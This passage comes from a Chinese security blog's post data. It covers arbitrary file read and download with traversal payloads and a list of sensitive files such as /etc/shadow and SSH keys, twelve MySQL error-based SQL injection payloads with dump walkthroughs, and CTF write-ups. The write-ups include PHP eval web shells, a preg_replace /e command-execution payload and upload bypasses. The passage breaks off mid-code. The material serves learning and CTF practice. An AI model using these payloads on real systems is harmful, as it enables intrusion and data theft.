//ssh私钥,ssh公钥是id_rsa.pub/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥/root/.ssh/known_hosts//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。/etc/passwd // 账户信息/etc/shadow // 账户密码文件/etc/my.cnf //mysql 配置文件/etc/httpd/conf/httpd.conf // Apache配置文件/root/.bash_history //用户历史命令记录文件/root/.mysql_history //mysql历史命令记录文件/proc/self/fd/fd[0-9]*(文件标识符)/proc/mounts //记录系统挂载设备/porc/config.gz //内核配置文件/var/lib/mlocate/mlocate.db //全文件路径/porc/self/cmdline //当前进程的cmdline参数 0x06任意文件读取与下载漏洞验证任意文件读取验证示例代码： &lt;?php $filename=$_GET[&#39;f&#39;]; echo file_get_contents($filename); ?&gt; 测试： readfile.php?f=../../../../../../etc/passwd readfile.php?file=../../../../../../../../etc/passwd%00 readfile.php?f=../index.txt file://伪协议 ，读取文件内容 readfile.php?f=file:///etc/passwd 任意文件下载验证示例代码： &lt;?php $filename = $_GET[&#39;f&#39;]; echo &#39;&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;&#39;; echo file_get_contents($filename); header(&#39;Content-Type: imgage/jpeg&#39;); header(&#39;Content-Disposition: attachment; filename=&#39;.$filename); header(&#39;Content-Lengh: &#39;.filesize($filename)); ?&gt; 当然，我下载这个文件并没有内容。 0x07漏洞判断参数f的参数值为PHP文件时： 1.文件被解析，则是文件包含漏洞2.显示源代码，则是文件查看漏洞3.提示下载，则是文件下载漏洞 0x08漏洞防御修复通用 过滤 . 点，使用户在url中不能回溯上级目录 正则严格判断用户输入的参数 php.ini配置open_basedir限定文件访问范围 文件下载漏洞修复 将下载区独立出来，放在项目路径外，给每个下载资源固定的URL，而不是所有的下载资源都是统一的URL：http://www.test.com/download?filename=文件名 净化数据：对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。 web应用程序可以使用chroot环境包含被访问的web目录，或者使用绝对路径+参数来访问文件目录，时使其即使越权也在访问目录之内。www目录就是一个chroot应用。由chroot创造出的那个根目录，叫做“chroot监狱”(所谓”监狱”就是指通过chroot机制来更改某个进程所能看到的根目录，即将某进程限制在指定目录中，保证该进程只能对该目录及其子目录的文件有所动作，从而保证整个服务器的安全。详细具体chroot的用法，可参考：http://blog.csdn.net/frozen_fish/article/details/2244870 任意文件下载漏洞也有可能是web所采用的中间件的版本低而导致问题的产生，例如ibm的websphere的任意文件下载漏洞，需更新其中间件的版本可修复。 要下载的文件地址保存至数据库中。 文件路径保存至数据库，让用户提交文件对应ID下载文件。 用户下载文件之前需要进行权限判断。 文件放在web无法直接访问的目录下。 不允许提供目录遍历服务。 公开文件可放置在web应用程序下载目录中通过链接进行下载。 记录文件下载日志。 0x09漏洞利用实战我学习任意文件读取与下载漏洞，就是因为遇到了一个任意文件读取与下载漏洞的Web题，所以在此实战一下RoarCTF2019-Web：Easy Java不是弱口令，也不能扫出目录。只有一个help.docx文件可以下载。于是可能是任意文件下载漏洞。点击蓝字“help”，抓包，发包。发现GET方式一直什么都下载不了。后来修改为POST，就可以下载了。因为题目提示java，所以可以先下载网站的配置文件，在根目录WEB-INF/web.xml发现操作flag的关键文件位置，读取(或下载)/WEB-INF/classes/下的flag的关键文件位置，又因为Java字节码类文件（.class）是Java编译器编译Java源文件（.java）产生的“目标文件”。最终得出flag的关键文件位置为：/WEB-INF/classes/com/wm/ctf/FlagController.classBase64解码得到flag","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"文件操作漏洞","slug":"漏洞原理/文件操作漏洞","permalink":"https://qwzf.github.io/categories/漏洞原理/文件操作漏洞/"}],"tags":[{"name":"题目复现","slug":"题目复现","permalink":"https://qwzf.github.io/tags/题目复现/"},{"name":"任意文件读取漏洞","slug":"任意文件读取漏洞","permalink":"https://qwzf.github.io/tags/任意文件读取漏洞/"},{"name":"任意文件下载漏洞","slug":"任意文件下载漏洞","permalink":"https://qwzf.github.io/tags/任意文件下载漏洞/"}],"author":"qwzf"},{"title":"SQL注入-报错注入","slug":"SQL注入-报错注入","date":"2019-09-24T16:21:26.491Z","updated":"2020-08-01T16:33:19.498Z","comments":true,"path":"2019/09/25/SQL注入-报错注入/","link":"","permalink":"https://qwzf.github.io/2019/09/25/SQL注入-报错注入/","excerpt":"","text":"前言之前没有对SQL报错注入详细总结过，总结一下。 SQL报错注入利用前提: 页面上没有显示位，但是需要输出 SQL 语句执行错误信息。比如 mysql_error()优点: 不需要显示位缺点: 需要输出 mysql_error( )的报错信息 12种SQL报错注入语句1、通过floor报错,注入语句如下: and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); 2、通过extractvalue报错,注入语句如下: and (extractvalue(1,concat(0x7e,(select user()),0x7e))); 3、通过updatexml报错,注入语句如下: and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 4、通过exp报错,注入语句如下: and exp(~(select * from (select user () ) a) ); 5、通过join报错,注入语句如下: select * from(select * from mysql.user ajoin mysql.user b)c; 6、通过NAME_CONST报错,注入语句如下: and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c); 7、通过GeometryCollection()报错,注入语句如下: and GeometryCollection(()select *from(select user () )a)b ); 8、通过polygon ()报错,注入语句如下: and polygon (()select * from(select user ())a)b ); 9、通过multipoint ()报错,注入语句如下: and multipoint (()select * from(select user() )a)b ); 10、通过multlinestring ()报错,注入语句如下: and multlinestring (()select * from(selectuser () )a)b ); 11、通过multpolygon ()报错,注入语句如下: and multpolygon (()select * from(selectuser () )a)b ); 12、通过linestring ()报错,注入语句如下: and linestring (()select * from(select user() )a)b ); mysql 常用函数系统信息函数 database() 返回当前数据库名user()或system_user() 返回当前登陆用户名version() 或@@version 返回MySQL服务器的版本benchmapk(count,expr) 将表达式expr重复运行count次connection_id() 返回当前客户的连接IDfound_rows() 返回最后一个SELECT查询进行检索的总行数session_user() 连接数据库的用户名current_user 当前用户名load_file() 读取本地文件@@datadir 读取数据库路径@@basedir mysql安装路径@@version_complie_os 查看操作系统 更多参考：mysql 常用函数收集 常见SQL报错注入SQL注入有12个报错方式，比较常见的有floor报错注入、extractvalue报错注入、updatexml报错注入和exp报错注入 floor报错注入floor报错注入是利用 count()函数 、rand()函数 、floor()函数 、group by 这几个特定的函数结合在一起产生的注入漏洞。缺一不可 select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); x和a是起的别名。 floor报错注入相关函数 count() 函数 count(*) 函数：返回表中的记录数 报错注入中，floor(rand(0)2)报错是有条件的，记录必须3条以上。所以使用count(\\) 函数 floor()函数：返回小于等于该值的最大整数（可以理解为向下取整，只保留整数部分） concat()函数：字符串拼接 报错注入中，利用concat()函数将想要获得的数据库内容拼接到concat()中，报错时作为内容输出。 rand()函数：可以用来生成0或1 rand(0)函数：也可以用来生成0或1 group by a 会根据a的规则对数据进行分组,而分组的时候,mysql会建立一个临时空表进行分组. floor(rand(0)*2)，乘以 2的原因 rand() 是返回 0 到 1 之间的随机数（即使用floor()后，只可以返回0）, 那么乘 2 后自然是返回 0 到 2 之间的随机数（即使用floor()后，可以返回0和1） rand(0)函数和rand()函数的区别rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数生成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成。 报错分析rand()函数在查询的时候会执行一次，插入的时候还会执行一次（即使用rand()的话，会执行多次）。这是整个语句报错的关键floor(rand(0)*2) 前六位是011011。 group by a先建立一个空表，用于分组，然后进行分组查询。 第一次rand()执行，查询的结果是0。于是需要插入分组，就在这时，floor(rand(0)*2)再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ，表中的结果就是： root@localhost1 1 然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2） root@localhost1 2 遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组， 然后floor(rand(0)*2)又被触发，生成第五个值 1 ， root@localhost1 2 root@localhost1 因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了。 此时插入因为重复出现同一个key，就会出现报错 重复出现key。而报错中会说明那个key有问题，key中结合了想要了解的字符串root@localhost 这样就实现了报错注入。 然后，concat()函数将想要获得的数据库内容拼接到concat()中，报错时作为内容输出。 （1）爆用户信息 select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); 用户：root（”1“是因为floor(rand(0)*2)随机返回1）（2）爆数据库名 select * from users where id=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a); 数据库名：security（3）爆数据表名 select * from users where id=1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a); 第四张表名：users（4）爆字段名 select * from users where id=1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); 第一个字段名：id第二个字段名：username第三个字段名：password（5）爆数据 select * from users where id=1 and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); username字段下的第一条数据：Dumb extractvalue报错注入select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); EXTRACTVALUE (XML_document, XPath_string)第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) extractvalue(目标xml文档，xml路径)第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式。 如果我们写入其他格式，就会报错。并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。 爆用户信息 select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); 用户：root两个”~“，是因为0x7e的ASCII码是”~“ updatexml报错注入select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); UPDATEXML (XML_document, XPath_string, new_value) 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)第三个参数：new_value，String格式，替换查找到的符合条件的数据 updatexml()函数与extractvalue()类似，是更新xml文档的函数。updatexml(目标xml文档，xml路径，更新的内容)爆用户信息 select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); exp报错注入exp溢出报错注入 select * from users where id=1 and exp(~(select * from (select user())a)); exp是以e为底的指数函数 mysql&gt; select exp(1); +-------------------+ | exp(1) | +-------------------+ | 2.718281828459045 | +-------------------+ 1 row in set (0.00 sec) 但是，数字太大会产生溢出。exp函数会在参数大于709时溢出，报错。 mysql&gt; select exp(709); +-----------------------+ | exp(709) | +-----------------------+ | 8.218407461554972e307 | +-----------------------+ 1 row in set (0.00 sec) mysql&gt; select exp(710); ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39; 将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，将成功执行的函数取反就会得到最大的无符号BIGINT值。按位取反符：~按位取反：二进制每一位取反，0变1，1变0BIGINT：BIGINT[(M)] [UNSIGNED] [ZEROFILL] M默认为20大整数。带符号的范围是-9223372036854775808到9223372036854775807。无符号的范围是0到18446744073709551615。M代表的并不是存储在数据库中的具体的长度。 mysql&gt; select ~0; +----------------------+ | ~0 | +----------------------+ | 18446744073709551615 | +----------------------+ 1 row in set (0.00 sec) mysql&gt; select ~(select user()); +----------------------+ | ~(select user()) | +----------------------+ | 18446744073709551615 | +----------------------+ 1 row in set (0.00 sec) 通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。 mysql&gt; select * from users where id=1 and exp(~(select * from (select database())a)); ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select `a`.`database()` from (select database() AS `database()`) `a`)))&#39; 在脚本语言中，就会将错误中的一些表达式转化成相应的字符串。从而实现了报错注入。例如(我不演示了)： DOUBLE value is out of range in &#39;exp(~((select &#39;error_based_hpf&#39; from dual)))&#39; 结语总结之后，对SQL报错注入，又有了更加深入的认识。继续努力！","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"SQL注入","slug":"漏洞原理/SQL注入","permalink":"https://qwzf.github.io/categories/漏洞原理/SQL注入/"}],"tags":[{"name":"报错注入","slug":"报错注入","permalink":"https://qwzf.github.io/tags/报错注入/"}],"author":"qwzf"},{"title":"攻防世界-Web(进阶区)","slug":"攻防世界-Web(进阶区)","date":"2019-09-05T15:46:17.151Z","updated":"2019-09-23T12:44:33.341Z","comments":true,"path":"2019/09/05/攻防世界-Web(进阶区)/","link":"","permalink":"https://qwzf.github.io/2019/09/05/攻防世界-Web(进阶区)/","excerpt":"","text":"前言又做了几道攻防世界的Web题，总结一下。 Web1：Cat题目没提示。点开题目，以为是命令执行。然而几番尝试后，发现并不是。。。其它也没什么提示，没思路了。偷瞄大佬博客然后我开始复现，?url=%80产生报错，找到绝对路径。从配置文件settings.py的报错中查看database的相关信息?url=@/opt/api/api/settings.py ?url=@/opt/api/database.sqlite3，报错信息中搜索ctf Web2：ics-06题目提示：设备管理基础服务数据处，有入侵者的痕迹。这个地方应该就是题了。看到?id=1第一个想法便是SQL注入，结果失败了。偷瞄大佬博客，发现需要爆破。于是我爆破id值所以id=2333时，返回长度不同，即可能返回了flag，查看得到flag Web3：NewsCenteremmm。题目报错。。等题目正常了再更新总结。 Web4：mfw题目没提示，直接开始做题。先查看源码有个flag页面，直接尝试，发现返回空白页面。然后再次发现有效信息，发现下面这个Git？！难道存在git源码泄露。果然是使用GitHack.py工具下载源码，并打开assert()函数 检查一个断言是否为 FALSE。 bool assert ( mixed $assertion [, string $description ] )如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。PHP 之 assert()函数strpos() 函数 查找字符串在另一字符串中第一次出现的位置。file_exists() 函数 检查文件或目录是否存在。审计源码：1、git传入page并赋值给$page。$file等于templates目录下的(page值).php文件内容2、如果strpos(&#39;$file&#39;, &#39;..&#39;) === false，$flie会被 assert() 当做 PHP 代码来执行。3、用file_exists() 函数检查$file文件是否存在。如果存在，返回文件内容。然后就是拼接构造payload了(又偷瞄了大佬博客) about.php&#39;, &#39;123&#39;) === false and system(&#39;cat templates/flag.php&#39;) and strpos(&#39;templates/flag 最终，得到flag Web5：NaNNaNNaNNaN-Batman题目，没有提示，只有个文件，下载查看应该是js代码(涉及了我的盲区，所以偷瞄大佬博客)。 eval() 函数:可计算某个字符串，并执行其中的的 JavaScript 代码。 alert() 函数:用于显示带有一条指定消息和一个 确定按钮的警告框。 修改整理如下： function $(){ var e=document.getElementById(&quot;c&quot;).value; if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null) if(e.match(/c7be9/)!=null){ var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e}&quot;]; var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;]; var r=[&quot;g{&quot;,&quot;e&quot;,&quot;_0&quot;]; var i=[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o){ document.write(s[o%4][0]);s[o%4].splice(0,1) } } } document.write(&#39;&lt;input id=&quot;c&quot;&gt;&lt;button οnclick=$()&gt;Ok&lt;/button&gt;&#39;); delete js代码一般可以在浏览器控制台执行。加上&lt;script&gt;&lt;/script&gt;标签也可以在html执行。控制台执行和html执行都是一个输入框。emmm。。。又不知道了(再次偷瞄)。方法一：审计代码，满足关键变量e的正则条件 e.length==16 e.match(/^be0f23/)!=null e.match(/233ac/)!=null e.match(/e98aa$/)!=null e.match(/c7be9/)!=null ^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa,其它的只要匹配到就行，没有位置要求 于是我们构造e的值：be0f233ac7be98aa 将构造的e输入到最初html执行的输入框中得到flag方法二：直接将下面代码复制到控制台执行 var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e}&quot;]; var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;]; var r=[&quot;g{&quot;,&quot;e&quot;,&quot;_0&quot;]; var i=[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o){ document.write(s[o%4][0]);s[o%4].splice(0,1) } Web6：uploademmm。题目报错。。等题目正常了再更新总结。 Web7：PHP2题目没有提示百度翻译一下，“你能浏览这个网站吗？”不能。。御剑扫描无果，源码也无发现。url后加index.php也不对。。。看大佬wp，竟然是url后加index.phps。。。urldecode()函数 解码 URL 字符串函数。此函数用于解码给出的已编码字符串中的任何 %##以及中文等被编码的内容。 （加号（’+’）被解码成一个空格字符）。该函数经常被使用于php解码URL中的中文字符串。相关函数：urlencode()函数，编码URL字符串函数。 审计代码，get传入的id经过urldecode()函数解码，如果解码结果为admin，输出“Access granted!”和Key值(即flag)。尝试对d进行url编码，即传入?id=a%64min，失败了。。。于是再次分析代码，发现是经过两次urlencode()函数解码。难道再对%编码？！%编码结果%25，传入?id=a%2564min，得到flag Web8：unserialize3题目提示unserialize，即反序列化。总结过，所以直接做题于是用serialize函数进行序列化(试过一句话，没有成功) &lt;?php class xctf{ var $flag = &#39;111&#39;; } $class1 = new xctf; $class1_ser = serialize($class1); print_r($class1_ser); ?&gt; 测试，发现显示”bad requests“。查询百度发现，当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。payload ?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;} 得到flag Web9：ics-05题目提示：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统所以工控云管理系统设备维护中心存在后门。查看源码几经尝试，发现，存在文件包含漏洞，可以使用php://filter伪协议对index.php进行读取Base64解码，找到关键代码如下： //方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试 if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;) { echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) { preg_replace($pattern, $replacement, $subject); }else{ die(); } } ?&gt; 代码审计一下：get传入pat、rep、sub并分别赋值给变量$pattern、$replacement、 $subject。如果设置了$pattern、$replacement、 $subject，执行preg_replace($pattern, $replacement, $subject);进行正则表达式的搜索和替换。 preg_replace( pattern , replacement , subject ) 函数当pattern指明/e标志时 ,preg_replace()会将replacement部分的代码当作PHP代码执行 (简单的说就是将replacement参数值放入eval()结构中)参考博客：深入研究PHP中的preg_replace和代码执行构造payload寻找flag： ?pat=/test/e&amp;rep=system(&#39;find / -iname flag&#39;)&amp;sub=test 源码提示127.0.0.1，所以X-Forwarded-For进行欺骗，Forward发包ls查看flag目录内容再通过cat命令，查看flag.php内容。查看源码，得到flag Web10：bug题目没有提示。打开题目，注册用户。进入到设置密码页面，修改密码，抓包尝试更改用户名为admin。发包，提示IP禁止。所以XFF(X-Forwarded-For)欺骗：X-Forwarded-For: 127.0.0.1登录成功。Where Is The Flag？查看源码filemanage，文件管理？！我学过文件上传漏洞和文件包含漏洞。应该就是其中一种，尝试之后发现do=upload时，是文件上传页面。应该就是文件上传漏洞了上传测试发现，只能上传图片1、写一个php文件，后缀改为.jpg，抓包改为.php进行文件类型绕过，结果失败。2、.php改为.php3、.php5也是失败。3、又想到做i春秋Web题Upload时，用到 &lt;script language=&quot;pHp&quot;&gt;@eval($_POST[&#39;a&#39;])&lt;/script&gt; 于是尝试再尝试，发现后缀还要是.php3或.php5才能绕过发包得到flag Web11：Triangle还没搞懂，过段时间补上总结 Web12：web2题目提示：解密相关函数strrev()：反转字符串。str_rot13()：对字符串执行 ROT13 编码。base64_encode()：对数据进行base64编码base64_decode()：对数据进行base64解码审计php代码，写出PHP解密代码 &lt;?php $miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;; function decode($miwen){ $_o=base64_decode(strrev(str_rot13($miwen)));//echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++){ $_c=substr($_o,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_=$_.$_c; } return strrev($_); } echo decode($miwen); ?&gt; 还可以写成python脚本进行解密。我不太会写，引用大佬脚本： import base64 def python_decode(string): zimu = &quot;abcdefghijklmnopqrstuvwxyz&quot; rot_13 =&quot;&quot; for i in string: if i.isdigit(): rot_13 += i else: try: rot_13 += zimu[zimu.index(i)-13] except: rot_13 += zimu[zimu.index(i.lower())-13].upper() fz = rot_13[::-1] base = base64.b64decode(fz) base = [chr(ord(i)-1) for i in base] fz = base[::-1] print &quot;&quot;.join(fz) python_decode(&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;) 写在后面就先总结那么多吧，后边的题貌似很难。继续努力吧。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://qwzf.github.io/tags/攻防世界/"}],"author":"qwzf"},{"title":"i春秋-Web(一)","slug":"i春秋-Web(一)","date":"2019-09-02T12:41:21.801Z","updated":"2019-09-02T12:50:53.079Z","comments":true,"path":"2019/09/02/i春秋-Web(一)/","link":"","permalink":"https://qwzf.github.io/2019/09/02/i春秋-Web(一)/","excerpt":"","text":"前言做了几道i春秋的Web题，所以总结一下。 Web1：爆破-1题目提示：某六位变量。查看题目，发现是代码审计 &lt;?php include &quot;flag.php&quot;; $a = @$_REQUEST[&#39;hello&#39;];//以get或post传入hello，并赋值给`$a` if(!preg_match(&#39;/^\\w*$/&#39;,$a )){//正则表达式^匹配一行的开头，$表示结束。\\w表示匹配包括下划线的任何单词字符，等价于&#39;[A-Za-z0-9_]&#39;。*号：匹配前面的子表达式零次或多次。 die(&#39;ERROR&#39;); } eval(&quot;var_dump($$a);&quot;); show_source(__FILE__);//__FILE__当前运行文件的完整路径和文件名。 ?&gt; 1、如果匹配正则表达式/^\\w$/，就打印变量 $$a2、$a是hello，$$a是六位变量$hello接下来不会了，所以百度一下发现超全局变量$GLOBALS*作用**：引用全局作用域中可用的全部变量。这样就会打印出当前定义的所有变量，也包括 include 的文件中的变量，flag 也存在在这些变量中。3、所以在URL后加?hello=GLOBALS，将参数hello修改为Globals实际执行语句： eval(&quot;var_dump($$a);&quot;) eval(&quot;var_dump($hello);&quot;) eval(&quot;var_dump($GLOBALS);&quot;) 最终得到flag Web2：爆破-2题目提示：flag不在变量中审计代码，很明显是代码执行。一句话+菜刀(或蚁剑)拿到flagpyload http://bd5c2e087fb744a4abb30339f0c088bfba3400c37b8245fe.changame.ichunqiu.com/?hello=${@eval($_POST[1])} 同时发现我这道题有多种解法，可以参考大佬博客：【i春秋】 Web —— 爆破-2 Web3：爆破-3题目提示：这个真是爆破审计代码：1、Session中的num初始值为0，time为当前时间，whoami初始值为ea。2、120秒之后会话结束。然后str_rands随机生成2个字母。3、whoami需要等于传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++。4、whoami=str_rands，循环10次后，输出flag。 所以只要第一次传进去的value与session中的相等，则网页会输出下一个value值，通过使用md5函数不能对数组进行处理的漏洞来绕过substr(md5($value),5,4)==0的判断，使nums得值大于10即可得到flag。但不会写脚本，所以借鉴了一下大佬的脚本： import requests url = &quot;http://18db51d66abf489ca48f1c310b898ab8e4ba00cd266e4219.changame.ichunqiu.com/?value[]=ea&quot; al = [&#39;abcdefghijklmnopqrstuvwxyz&#39;] s = requests.session() r=s.get(url) for i in range(20): url = &quot;http://18db51d66abf489ca48f1c310b898ab8e4ba00cd266e4219.changame.ichunqiu.com/?value[]=&quot; + r.content[0:2] r=s.get(url) print r.content Web4：Upload根据题目提示，这道题是文件上传漏洞。上传一句话查看，发现过滤了&lt;?php查询百度发现一句话也可以这样写：各种一句话木马大全找到一个。因为会过滤php，所以php写成pHp进行绕过。 &lt;script language=&quot;pHp&quot;&gt;@eval($_POST[&#39;b&#39;])&lt;/script&gt; 所以重新写下，然后上传。蚁剑(菜刀)一连成功然后就可以在后台找到flag了。 Web5：SQL题目提示：SQL注入flag在数据库。感觉可以联合查询注入。所以先判断整型还是字符型，是整型。查询列数，发现额。。不知道什么原因，感觉像是被过滤了什么。绕过，emmmm。。。没有绕过成功。查看大佬博客发现通过&lt;&gt;进行绕过大佬博客：一次简单的ctf SQL注入绕过试过后，发现只有ord&lt;&gt;er这种形式才能绕过。判断显示位，“2”处是显示位。接下来当然是爆库、爆表、爆字段、爆数据了。注意select和and的绕过就行了(sel&lt;&gt;ect an&lt;&gt;d)。最终得到flag Web6：include题目提示：文件包含漏洞因为PHP版本5.6.29，且allow_url_include为On、allow_url_fopen为Off。所以可以使用php伪协议读取POST数据，POST数据可以是命令执行代码，用ls查看当前目录。得到dle345aae.php，再用php://filter伪协议对文件进行读取，Base64转换一下，即可得到flag Web7：who are you?题目提示：who are you?(你是谁？)。一般情况下是admin抓包，发现一串像Base64的字符Base64解密结果是：f:5:&quot;thrfg&quot;;把thrfg换成admin，Base64加密，加密结果替换role值。发包没有得到flag。尝试无果，偷瞄一下大佬博客，rot13加密(凯撒密码码位移13)。。。解密结果：guest。脑洞挺大。不过也貌似比较好想到，admin(管理员账户)，想到guest(来宾账户)。所以admin，rot13加密、Base64加密。加密结果替换role值，发包得到提示文件上传，查看源码很明显应该一个是文件名，一个是数据先构造一下变量：filename=1.php&amp;data=&lt;?phpinfo();?&gt;得到NO NO NO应该是有正则匹配。不会绕，再次偷瞄大佬博客：利用数组绕过问题小总结php的函数一般都无法执行数组的，用数组来当参数，一般都能绕过。所以可以data[]，即filename=1.php&amp;data[]=&lt;?phpinfo();?&gt;。得到flag文件名访问，得到flag Web8：broken题目只提示了broken看到文件内容，很明显想到之前做过，是jsfuck编码。直接解，没解出来。因为题目已经提示文件损坏，所以了解一下jsfuck编码进行修复。JSfuck原理解析一JSFuck所以第一个[后应该加个]，jafuck解密弹出emmm，flag没在这？！应该还有要修的的地方。。不会了。。又一次偷瞄大佬博客：emmm，看了它一眼，然后没复现成功。 Web9：Do you know upload？Do you know upload？(你知道文件上传吗？)，我知道文件上传。进入题目查看源码很明显可以用php伪协议(php://filter)读取源码Base64解密，得到源码如下： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;Upload&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;图片上传&lt;/h1&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt; &lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/form&gt; &lt;!-- include($_GET[&#39;file&#39;]); --&gt; &lt;?php include($_GET[&#39;file&#39;]); @$pic = $_FILES[&quot;file&quot;][&quot;name&quot;]; @$pics = explode(&#39;.&#39; , $pic); if(@isset($_POST[submit])){ if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;))){ if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){ echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;; }else{ echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;; echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;; echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;; //echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;; if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])){ echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;; }else{ move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Stored in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; } } }else{ echo &quot;&lt;script&gt;alert(&#39;文件类型不允许&#39;)&lt;/script&gt;&quot;; echo &quot;Invalid file&quot;; } }else{ // echo &quot;Invalid 